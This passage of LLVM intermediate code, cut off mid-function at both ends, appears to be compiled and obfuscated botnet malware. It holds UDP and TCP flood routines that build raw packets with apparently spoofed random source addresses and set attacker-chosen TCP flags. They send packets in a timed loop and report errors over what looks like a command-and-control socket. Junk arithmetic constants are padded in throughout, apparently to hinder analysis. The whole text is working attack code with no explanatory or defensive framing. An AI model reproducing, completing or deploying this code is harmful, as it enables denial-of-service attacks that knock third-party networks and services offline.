  %263 = bitcast %struct.udphdr* %262 to i8*
  %264 = getelementptr inbounds i8, i8* %263, i64 8
  %265 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %264, i32 %265)
  %266 = bitcast i8* %204 to i16*
  %267 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 2
  %269 = load i16, i16* %268, align 2
  %270 = zext i16 %269 to i32
  %271 = call zeroext i16 @csum(i16* %266, i32 %270)
  %272 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 7
  store i16 %271, i16* %273, align 2
  %274 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %275 = load i32, i32* %11, align 4
  %276 = sub i32 0, %274
  %277 = sub i32 0, %275
  %278 = add i32 %276, %277
  %279 = sub i32 0, %278
  %280 = add nsw i32 %274, %275
  store i32 %279, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %281

; <label>:281:                                    ; preds = %347, %343, %333, %251
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %24, align 4
  %284 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %283, i8* %204, i64 %201, i32 0, %struct.sockaddr* %284, i32 16)
  %286 = call i32 @rand_cmwc()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %289 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %288, i32 0, i32 0
  %290 = bitcast %union.anon.3* %289 to %struct.anon.4*
  %291 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %290, i32 0, i32 0
  store i16 %287, i16* %291, align 2
  %292 = load i32, i32* %10, align 4
  %293 = icmp eq i32 %292, 0
  br i1 %293, label %294, label %296

; <label>:294:                                    ; preds = %282
  %295 = call i32 @rand_cmwc()
  br label %301

; <label>:296:                                    ; preds = %282
  %297 = load i32, i32* %10, align 4
  %298 = trunc i32 %297 to i16
  %299 = call zeroext i16 @htons(i16 zeroext %298) #13
  %300 = zext i16 %299 to i32
  br label %301

; <label>:301:                                    ; preds = %296, %294
  %302 = phi i32 [ %295, %294 ], [ %300, %296 ]
  %303 = trunc i32 %302 to i16
  %304 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %305 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %304, i32 0, i32 0
  %306 = bitcast %union.anon.3* %305 to %struct.anon.4*
  %307 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %306, i32 0, i32 1
  store i16 %303, i16* %307, align 2
  %308 = call i32 @rand_cmwc()
  %309 = trunc i32 %308 to i16
  %310 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 3
  store i16 %309, i16* %311, align 4
  %312 = load i32, i32* %27, align 4
  %313 = call i32 @GetRandomIP(i32 %312)
  %314 = call i32 @htonl(i32 %313) #13
  %315 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %316 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %315, i32 0, i32 8
  store i32 %314, i32* %316, align 4
  %317 = bitcast i8* %204 to i16*
  %318 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = call zeroext i16 @csum(i16* %317, i32 %321)
  %323 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %32, align 4
  %326 = load i32, i32* %18, align 4
  %327 = icmp eq i32 %325, %326
  br i1 %327, label %328, label %334

; <label>:328:                                    ; preds = %301
  %329 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %330 = load i32, i32* %31, align 4
  %331 = icmp sgt i32 %329, %330
  br i1 %331, label %332, label %333

; <label>:332:                                    ; preds = %328
  br label %353

; <label>:333:                                    ; preds = %328
  store i32 0, i32* %32, align 4
  br label %281

; <label>:334:                                    ; preds = %301
  %335 = load i32, i32* %32, align 4
  %336 = add i32 %335, 411355210
  %337 = add i32 %336, 1
  %338 = sub i32 %337, 411355210
  %339 = add i32 %335, 1
  store i32 %338, i32* %32, align 4
  %340 = load i32, i32* %33, align 4
  %341 = load i32, i32* %15, align 4
  %342 = icmp eq i32 %340, %341
  br i1 %342, label %343, label %347

; <label>:343:                                    ; preds = %334
  %344 = load i32, i32* %16, align 4
  %345 = mul nsw i32 %344, 1000
  %346 = call i32 @usleep(i32 %345)
  store i32 0, i32* %33, align 4
  br label %281

; <label>:347:                                    ; preds = %334
  %348 = load i32, i32* %33, align 4
  %349 = add i32 %348, 538890919
  %350 = add i32 %349, 1
  %351 = sub i32 %350, 538890919
  %352 = add i32 %348, 1
  store i32 %351, i32* %33, align 4
  br label %281

; <label>:353:                                    ; preds = %332
  %354 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %354)
  br label %355

; <label>:355:                                    ; preds = %353, %148, %140, %135, %76, %62, %51
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %516

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %516

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  br label %516

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %88

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub i32 32, -1758485097
  %69 = sub i32 %68, %67
  %70 = add i32 %69, -1758485097
  %71 = sub nsw i32 32, %67
  %72 = shl i32 1, %70
  %73 = sub i32 %72, 1592119434
  %74 = sub i32 %73, 1
  %75 = add i32 %74, 1592119434
  %76 = sub nsw i32 %72, 1
  %77 = xor i32 %75, -1
  %78 = and i32 13490476, %77
  %79 = xor i32 13490476, -1
  %80 = and i32 %75, %79
  %81 = xor i32 -1, -1
  %82 = and i32 %81, 13490476
  %83 = and i32 -1, %79
  %84 = or i32 %78, %80
  %85 = or i32 %82, %83
  %86 = xor i32 %84, %85
  %87 = xor i32 %75, -1
  store i32 %86, i32* %19, align 4
  br label %88

; <label>:88:                                     ; preds = %66, %65
  %89 = load i32, i32* %13, align 4
  %90 = sext i32 %89 to i64
  %91 = sub i64 0, %90
  %92 = sub i64 40, %91
  %93 = add i64 40, %90
  %94 = call i8* @llvm.stacksave()
  store i8* %94, i8** %20, align 8
  %95 = alloca i8, i64 %92, align 16
  %96 = bitcast i8* %95 to %struct.iphdr*
  store %struct.iphdr* %96, %struct.iphdr** %21, align 8
  %97 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %98 = bitcast %struct.iphdr* %97 to i8*
  %99 = getelementptr i8, i8* %98, i64 20
  %100 = bitcast i8* %99 to %struct.tcphdr*
  store %struct.tcphdr* %100, %struct.tcphdr** %22, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  %105 = load i32, i32* %19, align 4
  %106 = call i32 @GetRandomIP(i32 %105)
  %107 = call i32 @htonl(i32 %106) #13
  %108 = load i32, i32* %13, align 4
  %109 = sext i32 %108 to i64
  %110 = add i64 20, -4934853869903628451
  %111 = add i64 %110, %109
  %112 = sub i64 %111, -4934853869903628451
  %113 = add i64 20, %109
  %114 = trunc i64 %112 to i32
  call void @makeIPPacket(%struct.iphdr* %101, i32 %104, i32 %107, i8 zeroext 6, i32 %114)
  %115 = call i32 @rand_cmwc()
  %116 = trunc i32 %115 to i16
  %117 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon.0* %118 to %struct.anon.1*
  %120 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %119, i32 0, i32 0
  store i16 %116, i16* %120, align 4
  %121 = call i32 @rand_cmwc()
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.0* %123 to %struct.anon.1*
  %125 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %124, i32 0, i32 2
  store i32 %121, i32* %125, align 4
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 3
  store i32 0, i32* %129, align 4
  %130 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 0
  %132 = bitcast %union.anon.0* %131 to %struct.anon.1*
  %133 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = xor i16 %134, -1
  %136 = xor i16 -241, -1
  %137 = xor i16 -10546, -1
  %138 = or i16 %135, %136
  %139 = or i16 -10546, %137
  %140 = xor i16 %138, -1
  %141 = and i16 %140, %139
  %142 = and i16 %134, -241
  %143 = xor i16 %141, -1
  %144 = xor i16 80, -1
  %145 = xor i16 26885, -1
  %146 = and i16 %143, 26885
  %147 = and i16 %141, %145
  %148 = and i16 %144, 26885
  %149 = and i16 80, %145
  %150 = or i16 %146, %147
  %151 = or i16 %148, %149
  %152 = xor i16 %150, %151
  %153 = or i16 %143, %144
  %154 = xor i16 %153, -1
  %155 = or i16 26885, %145
  %156 = and i16 %154, %155
  %157 = or i16 %152, %156
  %158 = or i16 %141, 80
  store i16 %157, i16* %133, align 4
  %159 = load i8*, i8** %12, align 8
  %160 = call i32 @strcmp(i8* %159, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0)) #10
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %248, label %162

; <label>:162:                                    ; preds = %88
  %163 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon.0* %164 to %struct.anon.1*
  %166 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %165, i32 0, i32 4
  %167 = load i16, i16* %166, align 4
  %168 = xor i16 -513, -1
  %169 = xor i16 %167, %168
  %170 = and i16 %169, %167
  %171 = and i16 %167, -513
  %172 = xor i16 %170, -1
  %173 = xor i16 512, -1
  %174 = xor i16 -16683, -1
  %175 = and i16 %172, -16683
  %176 = and i16 %170, %174
  %177 = and i16 %173, -16683
  %178 = and i16 512, %174
  %179 = or i16 %175, %176
  %180 = or i16 %177, %178
  %181 = xor i16 %179, %180
  %182 = or i16 %172, %173
  %183 = xor i16 %182, -1
  %184 = or i16 -16683, %174
  %185 = and i16 %183, %184
  %186 = or i16 %181, %185
  %187 = or i16 %170, 512
  store i16 %186, i16* %166, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.0* %189 to %struct.anon.1*
  %191 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %190, i32 0, i32 4
  %192 = load i16, i16* %191, align 4
  %193 = xor i16 %192, -1
  %194 = xor i16 -1025, -1
  %195 = xor i16 29604, -1
  %196 = or i16 %193, %194
  %197 = or i16 29604, %195
  %198 = xor i16 %196, -1
  %199 = and i16 %198, %197
  %200 = and i16 %192, -1025
  %201 = and i16 %199, 1024
  %202 = xor i16 %199, 1024
  %203 = or i16 %201, %202
  %204 = or i16 %199, 1024
  store i16 %203, i16* %191, align 4
  %205 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %206 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.0* %206 to %struct.anon.1*
  %208 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = xor i16 %209, -1
  %211 = xor i16 -257, -1
  %212 = xor i16 -11953, -1
  %213 = or i16 %210, %211
  %214 = or i16 -11953, %212
  %215 = xor i16 %213, -1
  %216 = and i16 %215, %214
  %217 = and i16 %209, -257
  %218 = and i16 %216, 256
  %219 = xor i16 %216, 256
  %220 = or i16 %218, %219
  %221 = or i16 %216, 256
  store i16 %220, i16* %208, align 4
  %222 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.0* %223 to %struct.anon.1*
  %225 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = xor i16 -4097, -1
  %228 = xor i16 %226, %227
  %229 = and i16 %228, %226
  %230 = and i16 %226, -4097
  %231 = and i16 %229, 4096
  %232 = xor i16 %229, 4096
  %233 = or i16 %231, %232
  %234 = or i16 %229, 4096
  store i16 %233, i16* %225, align 4
  %235 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 4
  %239 = load i16, i16* %238, align 4
  %240 = xor i16 -2049, -1
  %241 = xor i16 %239, %240
  %242 = and i16 %241, %239
  %243 = and i16 %239, -2049
  %244 = and i16 %242, 2048
  %245 = xor i16 %242, 2048
  %246 = or i16 %244, %245
  %247 = or i16 %242, 2048
  store i16 %246, i16* %238, align 4
  br label %403

; <label>:248:                                    ; preds = %88
  %249 = load i8*, i8** %12, align 8
  %250 = call i8* @strtok(i8* %249, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %250, i8** %23, align 8
  br label %251

; <label>:251:                                    ; preds = %400, %248
  %252 = load i8*, i8** %23, align 8
  %253 = icmp ne i8* %252, null
  br i1 %253, label %254, label %402

; <label>:254:                                    ; preds = %251
  %255 = load i8*, i8** %23, align 8
  %256 = call i32 @strcmp(i8* %255, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.77, i32 0, i32 0)) #10
  %257 = icmp ne i32 %256, 0
  br i1 %257, label %284, label %258

; <label>:258:                                    ; preds = %254
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 4
  %263 = load i16, i16* %262, align 4
  %264 = xor i16 -513, -1
  %265 = xor i16 %263, %264
  %266 = and i16 %265, %263
  %267 = and i16 %263, -513
  %268 = xor i16 %266, -1
  %269 = xor i16 512, -1
  %270 = xor i16 -15679, -1
  %271 = and i16 %268, -15679
  %272 = and i16 %266, %270
  %273 = and i16 %269, -15679
  %274 = and i16 512, %270
  %275 = or i16 %271, %272
  %276 = or i16 %273, %274
  %277 = xor i16 %275, %276
  %278 = or i16 %268, %269
  %279 = xor i16 %278, -1
  %280 = or i16 -15679, %270
  %281 = and i16 %279, %280
  %282 = or i16 %277, %281
  %283 = or i16 %266, 512
  store i16 %282, i16* %262, align 4
  br label %400

; <label>:284:                                    ; preds = %254
  %285 = load i8*, i8** %23, align 8
  %286 = call i32 @strcmp(i8* %285, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i32 0, i32 0)) #10
  %287 = icmp ne i32 %286, 0
  br i1 %287, label %302, label %288

; <label>:288:                                    ; preds = %284
  %289 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 0
  %291 = bitcast %union.anon.0* %290 to %struct.anon.1*
  %292 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %291, i32 0, i32 4
  %293 = load i16, i16* %292, align 4
  %294 = xor i16 -1025, -1
  %295 = xor i16 %293, %294
  %296 = and i16 %295, %293
  %297 = and i16 %293, -1025
  %298 = and i16 %296, 1024
  %299 = xor i16 %296, 1024
  %300 = or i16 %298, %299
  %301 = or i16 %296, 1024
  store i16 %300, i16* %292, align 4
  br label %399

; <label>:302:                                    ; preds = %284
  %303 = load i8*, i8** %23, align 8
  %304 = call i32 @strcmp(i8* %303, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i32 0, i32 0)) #10
  %305 = icmp ne i32 %304, 0
  br i1 %305, label %336, label %306

; <label>:306:                                    ; preds = %302
  %307 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon.0* %308 to %struct.anon.1*
  %310 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %309, i32 0, i32 4
  %311 = load i16, i16* %310, align 4
  %312 = xor i16 %311, -1
  %313 = xor i16 -257, -1
  %314 = xor i16 24261, -1
  %315 = or i16 %312, %313
  %316 = or i16 24261, %314
  %317 = xor i16 %315, -1
  %318 = and i16 %317, %316
  %319 = and i16 %311, -257
  %320 = xor i16 %318, -1
  %321 = xor i16 256, -1
  %322 = xor i16 19429, -1
  %323 = and i16 %320, 19429
  %324 = and i16 %318, %322
  %325 = and i16 %321, 19429
  %326 = and i16 256, %322
  %327 = or i16 %323, %324
  %328 = or i16 %325, %326
  %329 = xor i16 %327, %328
  %330 = or i16 %320, %321
  %331 = xor i16 %330, -1
  %332 = or i16 19429, %322
  %333 = and i16 %331, %332
  %334 = or i16 %329, %333
  %335 = or i16 %318, 256
  store i16 %334, i16* %310, align 4
  br label %398

; <label>:336:                                    ; preds = %302
  %337 = load i8*, i8** %23, align 8
  %338 = call i32 @strcmp(i8* %337, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.80, i32 0, i32 0)) #10
  %339 = icmp ne i32 %338, 0
  br i1 %339, label %370, label %340

; <label>:340:                                    ; preds = %336
  %341 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i32 0, i32 0
  %343 = bitcast %union.anon.0* %342 to %struct.anon.1*
  %344 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %343, i32 0, i32 4
  %345 = load i16, i16* %344, align 4
  %346 = xor i16 %345, -1
  %347 = xor i16 -4097, -1
  %348 = xor i16 -24567, -1
  %349 = or i16 %346, %347
  %350 = or i16 -24567, %348
  %351 = xor i16 %349, -1
  %352 = and i16 %351, %350
  %353 = and i16 %345, -4097
  %354 = xor i16 %352, -1
  %355 = xor i16 4096, -1
  %356 = xor i16 32164, -1
  %357 = and i16 %354, 32164
  %358 = and i16 %352, %356
  %359 = and i16 %355, 32164
  %360 = and i16 4096, %356
  %361 = or i16 %357, %358
  %362 = or i16 %359, %360
  %363 = xor i16 %361, %362
  %364 = or i16 %354, %355
  %365 = xor i16 %364, -1
  %366 = or i16 32164, %356
  %367 = and i16 %365, %366
  %368 = or i16 %363, %367
  %369 = or i16 %352, 4096
  store i16 %368, i16* %344, align 4
  br label %397

; <label>:370:                                    ; preds = %336
  %371 = load i8*, i8** %23, align 8
  %372 = call i32 @strcmp(i8* %371, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0)) #10
  %373 = icmp ne i32 %372, 0
  br i1 %373, label %392, label %374

; <label>:374:                                    ; preds = %370
  %375 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %376 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %375, i32 0, i32 0
  %377 = bitcast %union.anon.0* %376 to %struct.anon.1*
  %378 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %377, i32 0, i32 4
  %379 = load i16, i16* %378, align 4
  %380 = xor i16 %379, -1
  %381 = xor i16 -2049, -1
  %382 = xor i16 -2811, -1
  %383 = or i16 %380, %381
  %384 = or i16 -2811, %382
  %385 = xor i16 %383, -1
  %386 = and i16 %385, %384
  %387 = and i16 %379, -2049
  %388 = and i16 %386, 2048
  %389 = xor i16 %386, 2048
  %390 = or i16 %388, %389
  %391 = or i16 %386, 2048
  store i16 %390, i16* %378, align 4
  br label %396

; <label>:392:                                    ; preds = %370
  %393 = load i32, i32* @mainCommSock, align 4
  %394 = load i8*, i8** %23, align 8
  %395 = call i32 (i32, i8*, ...) @sockprintf(i32 %393, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.82, i32 0, i32 0), i8* %394)
  br label %396

; <label>:396:                                    ; preds = %392, %374
  br label %397

; <label>:397:                                    ; preds = %396, %340
  br label %398

; <label>:398:                                    ; preds = %397, %306
  br label %399

; <label>:399:                                    ; preds = %398, %288
  br label %400

; <label>:400:                                    ; preds = %399, %258
  %401 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %401, i8** %23, align 8
  br label %251

; <label>:402:                                    ; preds = %251
  br label %403

; <label>:403:                                    ; preds = %402, %162
  %404 = call i32 @rand_cmwc()
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 0
  %408 = bitcast %union.anon.0* %407 to %struct.anon.1*
  %409 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %408, i32 0, i32 5
  store i16 %405, i16* %409, align 2
  %410 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon.0* %411 to %struct.anon.1*
  %413 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %412, i32 0, i32 6
  store i16 0, i16* %413, align 4
  %414 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 0
  %416 = bitcast %union.anon.0* %415 to %struct.anon.1*
  %417 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %416, i32 0, i32 7
  store i16 0, i16* %417, align 2
  %418 = load i32, i32* %9, align 4
  %419 = icmp eq i32 %418, 0
  br i1 %419, label %420, label %422

; <label>:420:                                    ; preds = %403
  %421 = call i32 @rand_cmwc()
  br label %427

; <label>:422:                                    ; preds = %403
  %423 = load i32, i32* %9, align 4
  %424 = trunc i32 %423 to i16
  %425 = call zeroext i16 @htons(i16 zeroext %424) #13
  %426 = zext i16 %425 to i32
  br label %427

; <label>:427:                                    ; preds = %422, %420
  %428 = phi i32 [ %421, %420 ], [ %426, %422 ]
  %429 = trunc i32 %428 to i16
  %430 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 0
  %432 = bitcast %union.anon.0* %431 to %struct.anon.1*
  %433 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %432, i32 0, i32 1
  store i16 %429, i16* %433, align 2
  %434 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %435 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %436 = call zeroext i16 @tcpcsum(%struct.iphdr* %434, %struct.tcphdr* %435)
  %437 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 0
  %439 = bitcast %union.anon.0* %438 to %struct.anon.1*
  %440 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %439, i32 0, i32 6
  store i16 %436, i16* %440, align 4
  %441 = bitcast i8* %95 to i16*
  %442 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 2
  %444 = load i16, i16* %443, align 2
  %445 = zext i16 %444 to i32
  %446 = call zeroext i16 @csum(i16* %441, i32 %445)
  %447 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 7
  store i16 %446, i16* %448, align 2
  %449 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %450 = load i32, i32* %10, align 4
  %451 = sub i32 %449, 28485658
  %452 = add i32 %451, %450
  %453 = add i32 %452, 28485658
  %454 = add nsw i32 %449, %450
  store i32 %453, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %455

; <label>:455:                                    ; preds = %508, %507, %427
  br label %456

; <label>:456:                                    ; preds = %455
  %457 = load i32, i32* %17, align 4
  %458 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %459 = call i64 @sendto(i32 %457, i8* %95, i64 %92, i32 0, %struct.sockaddr* %458, i32 16)
  %460 = load i32, i32* %19, align 4
  %461 = call i32 @GetRandomIP(i32 %460)
  %462 = call i32 @htonl(i32 %461) #13
  %463 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 8
  store i32 %462, i32* %464, align 4
  %465 = call i32 @rand_cmwc()
  %466 = trunc i32 %465 to i16
  %467 = load %struct.iphdr*, %struct.iphdr** %21, align 8
